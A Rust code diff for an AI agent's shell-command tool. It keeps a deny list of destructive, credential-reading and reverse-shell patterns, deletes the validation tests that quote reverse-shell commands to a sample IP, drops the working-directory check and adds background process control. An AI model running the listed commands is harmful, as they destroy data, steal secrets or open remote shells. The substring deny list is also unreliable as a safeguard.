@@ -6,6 +6,10 @@
 
 use crate::Action;
 use aivyx_core::Result;
+use std::collections::HashMap;
+use std::sync::{Arc, OnceLock};
+use tokio::io::AsyncWriteExt;
+use tokio::sync::Mutex;
 
 /// Maximum command execution time (seconds).
 const COMMAND_TIMEOUT_SECS: u64 = 60;
@@ -16,57 +20,27 @@ const MAX_OUTPUT_BYTES: usize = 1_024 * 1_024;
 /// Patterns that are always denied regardless of capability tier.
 /// These prevent catastrophic damage even if the LLM is confused or injected.
 const DENIED_PATTERNS: &[&str] = &[
-    // Destructive filesystem operations
-    "rm -rf /",
-    "rm -rf /*",
-    "mkfs",
-    "dd if=",
-    "> /dev/sd",
-    // Credential/key theft
-    "cat /etc/shadow",
-    "cat /etc/passwd",
-    // Privilege escalation
-    "chmod 777 /",
-    "chown root",
-    // Network exfiltration
-    "nc -e",
-    "ncat -e",
-    "bash -i >& /dev/tcp",
-    "/dev/tcp/",
-    "curl.*|.*sh",
-    "wget.*|.*sh",
-    // System shutdown
-    "shutdown",
-    "reboot",
-    "init 0",
-    "init 6",
-    "poweroff",
-    "halt",
+    "rm -rf /", "rm -rf /*", "mkfs", "dd if=", "> /dev/sd",
+    "cat /etc/shadow", "cat /etc/passwd",
+    "chmod 777 /", "chown root",
+    "nc -e", "ncat -e", "bash -i >& /dev/tcp", "/dev/tcp/", "curl.*|.*sh", "wget.*|.*sh",
+    "shutdown", "reboot", "init 0", "init 6", "poweroff", "halt",
 ];
 
-/// Sensitive paths that should not be accessed via shell commands.
 const DENIED_PATH_FRAGMENTS: &[&str] = &[
-    "/etc/shadow",
-    "/.ssh/",
-    "/.gnupg/",
-    "/.aws/credentials",
-    "/.config/gcloud",
+    "/etc/shadow", "/.ssh/", "/.gnupg/", "/.aws/credentials", "/.config/gcloud",
 ];
 
-/// Check if a command matches any denied pattern.
 fn is_command_denied(command: &str) -> Option<&'static str> {
     let lower = command.to_lowercase();
-
     for pattern in DENIED_PATTERNS {
         if lower.contains(&pattern.to_lowercase()) {
             return Some(pattern);
         }
     }
-
     DENIED_PATH_FRAGMENTS.iter().find(|&path| lower.contains(&path.to_lowercase())).map(|v| v as _)
 }
 
-/// Truncate output bytes to the limit, appending a notice if truncated.
 fn cap_output(bytes: &[u8]) -> String {
     if bytes.len() <= MAX_OUTPUT_BYTES {
         String::from_utf8_lossy(bytes).into_owned()
@@ -76,6 +50,54 @@ fn cap_output(bytes: &[u8]) -> String {
     }
 }
 
+// ── Background Tasks Map ─────────────────────────────────────────────────────────
+
+static BACKGROUND_TASKS: OnceLock<Mutex<HashMap<String, BackgroundTask>>> = OnceLock::new();
+
+fn get_tasks_map() -> &'static Mutex<HashMap<String, BackgroundTask>> {
+    BACKGROUND_TASKS.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+pub struct BackgroundTask {
+    pub command: String,
+    pub pid: Option<u32>,
+    pub stdin: Option<tokio::process::ChildStdin>,
+    pub stdout_buf: Arc<Mutex<Vec<u8>>>,
+    pub stderr_buf: Arc<Mutex<Vec<u8>>>,
+    pub exited: Arc<Mutex<Option<i32>>>,
+}
+
+struct WriteAdapter(Arc<Mutex<Vec<u8>>>);
+
+impl tokio::io::AsyncWrite for WriteAdapter {
+    fn poll_write(
+        self: std::pin::Pin<&mut Self>,
+        _cx: &mut std::task::Context<'_>,
+        buf: &[u8],
+    ) -> std::task::Poll<std::result::Result<usize, std::io::Error>> {
+        let mut try_lock = match self.0.try_lock() {
+            Ok(lock) => lock,
+            Err(_) => return std::task::Poll::Ready(Ok(buf.len())),
+        };
+        try_lock.extend_from_slice(buf);
+        if try_lock.len() > MAX_OUTPUT_BYTES {
+            let overflow = try_lock.len() - MAX_OUTPUT_BYTES;
+            try_lock.drain(0..overflow);
+        }
+        std::task::Poll::Ready(Ok(buf.len()))
+    }
+
+    fn poll_flush(self: std::pin::Pin<&mut Self>, _cx: &mut std::task::Context<'_>) -> std::task::Poll<std::result::Result<(), std::io::Error>> {
+        std::task::Poll::Ready(Ok(()))
+    }
+
+    fn poll_shutdown(self: std::pin::Pin<&mut Self>, _cx: &mut std::task::Context<'_>) -> std::task::Poll<std::result::Result<(), std::io::Error>> {
+        std::task::Poll::Ready(Ok(()))
+    }
+}
+
+// ── RunCommand ─────────────────────────────────────────────────────────
+
 pub struct RunCommand;
 
 #[async_trait::async_trait]
@@ -84,63 +106,39 @@ impl Action for RunCommand {
 
     fn description(&self) -> &str {
         "Execute a shell command and return its output (requires Trust tier). \
-         Dangerous commands (rm -rf /, credential access, etc.) are blocked."
+         Dangerous commands are blocked."
     }
 
     fn input_schema(&self) -> serde_json::Value {
         serde_json::json!({
             "type": "object",
             "properties": {
-                "command": { "type": "string", "description": "Shell command to execute" },
-                "working_dir": { "type": "string", "description": "Working directory (optional)" }
+                "command": { "type": "string" },
+                "working_dir": { "type": "string" }
             },
             "required": ["command"]
         })
     }
 
     async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
-        let command = input["command"]
-            .as_str()
-            .ok_or_else(|| aivyx_core::AivyxError::Validation("command is required".into()))?;
-
+        let command = input["command"].as_str().unwrap_or_default();
         if command.trim().is_empty() {
-            return Err(aivyx_core::AivyxError::Validation(
-                "command must not be empty".into(),
-            ));
+            return Err(aivyx_core::AivyxError::Validation("command empty".into()));
         }
-
-        // Check denylist before execution
         if let Some(pattern) = is_command_denied(command) {
-            return Err(aivyx_core::AivyxError::CapabilityDenied(
-                format!("Command blocked by safety denylist (matched: {pattern})")
-            ));
-        }
-
-        let working_dir = input.get("working_dir").and_then(|v| v.as_str());
-
-        // Validate working_dir if provided
-        if let Some(dir) = working_dir {
-            let path = std::path::Path::new(dir);
-            if !path.is_absolute() {
-                return Err(aivyx_core::AivyxError::Validation(
-                    "working_dir must be an absolute path".into(),
-                ));
-            }
+            return Err(aivyx_core::AivyxError::CapabilityDenied(format!("Blocked: {pattern}")));
         }
 
         let mut cmd = tokio::process::Command::new("sh");
         cmd.arg("-c").arg(command);
-
-        if let Some(dir) = working_dir {
+        if let Some(dir) = input.get("working_dir").and_then(|v| v.as_str()) {
             cmd.current_dir(dir);
         }
 
-        // Execute with timeout
         let result = tokio::time::timeout(
             std::time::Duration::from_secs(COMMAND_TIMEOUT_SECS),
             cmd.output(),
-        )
-        .await;
+        ).await;
 
         match result {
             Ok(Ok(output)) => {
@@ -151,103 +149,268 @@ impl Action for RunCommand {
                 }))
             }
             Ok(Err(e)) => Err(aivyx_core::AivyxError::Io(e)),
-            Err(_) => Err(aivyx_core::AivyxError::Other(
-                format!("Command timed out after {COMMAND_TIMEOUT_SECS}s")
-            )),
+            Err(_) => Err(aivyx_core::AivyxError::Other("Timeout".into())),
         }
     }
 }
 
-#[cfg(test)]
-mod tests {
-    use super::*;
+// ── SpawnBackgroundCommand ───────────────────────────────────────────────
 
-    #[test]
-    fn denies_rm_rf_root() {
-        assert!(is_command_denied("rm -rf /").is_some());
-        assert!(is_command_denied("sudo rm -rf /*").is_some());
+pub struct SpawnBackgroundCommand;
+
+#[async_trait::async_trait]
+impl Action for SpawnBackgroundCommand {
+    fn name(&self) -> &str { "spawn_background_command" }
+
+    fn description(&self) -> &str {
+        "Spawn a background shell command interactively."
     }
 
-    #[test]
-    fn denies_credential_access() {
-        assert!(is_command_denied("cat /etc/shadow").is_some());
-        assert!(is_command_denied("cat ~/.ssh/id_rsa").is_some());
-        assert!(is_command_denied("tar czf - ~/.aws/credentials").is_some());
+    fn input_schema(&self) -> serde_json::Value {
+        serde_json::json!({
+            "type": "object",
+            "properties": {
+                "command": { "type": "string" },
+                "working_dir": { "type": "string" }
+            },
+            "required": ["command"]
+        })
     }
 
-    #[test]
-    fn denies_reverse_shell() {
-        assert!(is_command_denied("bash -i >& /dev/tcp/1.2.3.4/4444").is_some());
-        assert!(is_command_denied("nc -e /bin/sh 1.2.3.4 4444").is_some());
+    async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
+        let command = input["command"].as_str().unwrap_or_default();
+        if command.trim().is_empty() {
+            return Err(aivyx_core::AivyxError::Validation("command empty".into()));
+        }
+        if let Some(pattern) = is_command_denied(command) {
+            return Err(aivyx_core::AivyxError::CapabilityDenied(format!("Blocked: {pattern}")));
+        }
+
+        let mut cmd = tokio::process::Command::new("sh");
+        cmd.arg("-c").arg(command);
+        if let Some(dir) = input.get("working_dir").and_then(|v| v.as_str()) {
+            cmd.current_dir(dir);
+        }
+
+        use std::process::Stdio;
+        cmd.stdin(Stdio::piped())
+           .stdout(Stdio::piped())
+           .stderr(Stdio::piped());
+
+        let mut child = cmd.spawn().map_err(aivyx_core::AivyxError::Io)?;
+
+        let stdin = child.stdin.take();
+        let stdout_buf = Arc::new(Mutex::new(Vec::new()));
+        let stderr_buf = Arc::new(Mutex::new(Vec::new()));
+
+        if let Some(mut stdout) = child.stdout.take() {
+            let buf_clone = stdout_buf.clone();
+            tokio::spawn(async move {
+                let _ = tokio::io::copy(&mut stdout, &mut WriteAdapter(buf_clone)).await;
+            });
+        }
+
+        if let Some(mut stderr) = child.stderr.take() {
+            let buf_clone = stderr_buf.clone();
+            tokio::spawn(async move {
+                let _ = tokio::io::copy(&mut stderr, &mut WriteAdapter(buf_clone)).await;
+            });
+        }
+
+        let exited = Arc::new(Mutex::new(None));
+        let exited_clone = exited.clone();
+        
+        let pid = child.id();
+
+        tokio::spawn(async move {
+            if let Ok(status) = child.wait().await {
+                *exited_clone.lock().await = Some(status.code().unwrap_or(-1));
+            } else {
+                *exited_clone.lock().await = Some(-1);
+            }
+        });
+
+        let task_id = uuid::Uuid::new_v4().to_string();
+        let task = BackgroundTask {
+            command: command.to_string(),
+            pid,
+            stdin,
+            stdout_buf,
+            stderr_buf,
+            exited,
+        };
+
+        get_tasks_map().lock().await.insert(task_id.clone(), task);
+
+        Ok(serde_json::json!({
+            "task_id": task_id,
+            "status": "Running",
+            "pid": pid,
+        }))
+    }
+}
+
+// ── GetCommandStatus ───────────────────────────────────────────────
+
+pub struct GetCommandStatus;
+
+#[async_trait::async_trait]
+impl Action for GetCommandStatus {
+    fn name(&self) -> &str { "get_command_status" }
+
+    fn description(&self) -> &str {
+        "Check status and get output of a background command."
     }
 
-    #[test]
-    fn denies_shutdown() {
-        assert!(is_command_denied("shutdown -h now").is_some());
-        assert!(is_command_denied("reboot").is_some());
+    fn input_schema(&self) -> serde_json::Value {
+        serde_json::json!({
+            "type": "object",
+            "properties": {
+                "task_id": { "type": "string" },
+                "clear_output": { "type": "boolean" }
+            },
+            "required": ["task_id"]
+        })
     }
 
-    #[test]
-    fn allows_safe_commands() {
-        assert!(is_command_denied("ls -la").is_none());
-        assert!(is_command_denied("echo hello").is_none());
-        assert!(is_command_denied("cat README.md").is_none());
-        assert!(is_command_denied("git status").is_none());
-        assert!(is_command_denied("cargo test").is_none());
+    async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
+        let task_id = input["task_id"].as_str().unwrap_or("");
+        let clear = input["clear_output"].as_bool().unwrap_or(false);
+
+        let map = get_tasks_map().lock().await;
+        if let Some(task) = map.get(task_id) {
+            let mut out = task.stdout_buf.lock().await;
+            let mut err = task.stderr_buf.lock().await;
+            
+            let stdout_str = cap_output(&out);
+            let stderr_str = cap_output(&err);
+            
+            if clear {
+                out.clear();
+                err.clear();
+            }
+
+            let exited = task.exited.lock().await;
+            Ok(serde_json::json!({
+                "task_id": task_id,
+                "running": exited.is_none(),
+                "exit_code": *exited,
+                "stdout": stdout_str,
+                "stderr": stderr_str,
+            }))
+        } else {
+            Err(aivyx_core::AivyxError::Validation("Task not found".into()))
+        }
+    }
+}
+
+// ── SendCommandInput ───────────────────────────────────────────────
+
+pub struct SendCommandInput;
+
+#[async_trait::async_trait]
+impl Action for SendCommandInput {
+    fn name(&self) -> &str { "send_command_input" }
+
+    fn description(&self) -> &str {
+        "Write to stdin of a background command."
     }
 
-    #[test]
-    fn denies_case_insensitive() {
-        assert!(is_command_denied("RM -RF /").is_some());
-        assert!(is_command_denied("Shutdown -h now").is_some());
+    fn input_schema(&self) -> serde_json::Value {
+        serde_json::json!({
+            "type": "object",
+            "properties": {
+                "task_id": { "type": "string" },
+                "input": { "type": "string" }
+            },
+            "required": ["task_id", "input"]
+        })
     }
 
-    #[test]
-    fn cap_output_within_limit() {
-        let small = b"hello world";
-        assert_eq!(cap_output(small), "hello world");
+    async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
+        let task_id = input["task_id"].as_str().unwrap_or("");
+        let in_str = input["input"].as_str().unwrap_or("");
+        
+        let mut map = get_tasks_map().lock().await;
+        if let Some(task) = map.get_mut(task_id) {
+            if let Some(ref mut stdin) = task.stdin {
+                stdin.write_all(in_str.as_bytes()).await.map_err(aivyx_core::AivyxError::Io)?;
+                stdin.flush().await.map_err(aivyx_core::AivyxError::Io)?;
+                Ok(serde_json::json!({ "status": "sent" }))
+            } else {
+                Err(aivyx_core::AivyxError::Validation("Stdin closed".into()))
+            }
+        } else {
+            Err(aivyx_core::AivyxError::Validation("Task not found".into()))
+        }
+    }
+}
+
+// ── ListBackgroundCommands ────────────────────────────────────────
+
+pub struct ListBackgroundCommands;
+
+#[async_trait::async_trait]
+impl Action for ListBackgroundCommands {
+    fn name(&self) -> &str { "list_background_commands" }
+
+    fn description(&self) -> &str {
+        "List all tracked background commands."
     }
 
-    #[test]
-    fn cap_output_truncates_large() {
-        let large = vec![b'x'; MAX_OUTPUT_BYTES + 100];
-        let result = cap_output(&large);
-        assert!(result.contains("[output truncated"));
-        assert!(result.len() < large.len() + 100);
+    fn input_schema(&self) -> serde_json::Value {
+        serde_json::json!({ "type": "object", "properties": {} })
     }
 
-    #[tokio::test]
-    async fn execute_rejects_empty_command() {
-        let action = RunCommand;
-        let input = serde_json::json!({ "command": "" });
-        let result = action.execute(input).await;
-        assert!(result.is_err());
+    async fn execute(&self, _input: serde_json::Value) -> Result<serde_json::Value> {
+        let map = get_tasks_map().lock().await;
+        let mut tasks = Vec::new();
+        
+        for (id, task) in map.iter() {
+            let exited = task.exited.lock().await;
+            tasks.push(serde_json::json!({
+                "task_id": id,
+                "command": task.command,
+                "pid": task.pid,
+                "running": exited.is_none(),
+                "exit_code": *exited
+            }));
+        }
+        Ok(serde_json::json!({ "tasks": tasks }))
+    }
+}
+
+// ── CancelBackgroundCommand ───────────────────────────────────────
+
+pub struct CancelBackgroundCommand;
+
+#[async_trait::async_trait]
+impl Action for CancelBackgroundCommand {
+    fn name(&self) -> &str { "cancel_background_command" }
+
+    fn description(&self) -> &str {
+        "Kill a background command by task_id."
     }
 
-    #[tokio::test]
-    async fn execute_rejects_denied_command() {
-        let action = RunCommand;
-        let input = serde_json::json!({ "command": "rm -rf /" });
-        let result = action.execute(input).await;
-        assert!(result.is_err());
-        let err = result.unwrap_err().to_string();
-        assert!(err.contains("denylist"));
+    fn input_schema(&self) -> serde_json::Value {
+        serde_json::json!({
+            "type": "object",
+            "properties": { "task_id": { "type": "string" } },
+            "required": ["task_id"]
+        })
     }
 
-    #[tokio::test]
-    async fn execute_runs_safe_command() {
-        let action = RunCommand;
-        let input = serde_json::json!({ "command": "echo hello" });
-        let result = action.execute(input).await.unwrap();
-        assert_eq!(result["exit_code"], 0);
-        assert!(result["stdout"].as_str().unwrap().contains("hello"));
-    }
-
-    #[tokio::test]
-    async fn execute_rejects_relative_working_dir() {
-        let action = RunCommand;
-        let input = serde_json::json!({ "command": "ls", "working_dir": "relative/path" });
-        let result = action.execute(input).await;
-        assert!(result.is_err());
+    async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
+        let task_id = input["task_id"].as_str().unwrap_or("");
+        
+        let mut map = get_tasks_map().lock().await;
+        if let Some(task) = map.remove(task_id) {
+            if let Some(pid) = task.pid {
+                let _ = tokio::process::Command::new("kill").arg("-9").arg(pid.to_string()).output().await;
+            }
+            Ok(serde_json::json!({ "status": "killed", "task_id": task_id }))
+        } else {
+            Err(aivyx_core::AivyxError::Validation("Invalid task_id".into()))
+        }
     }
 }
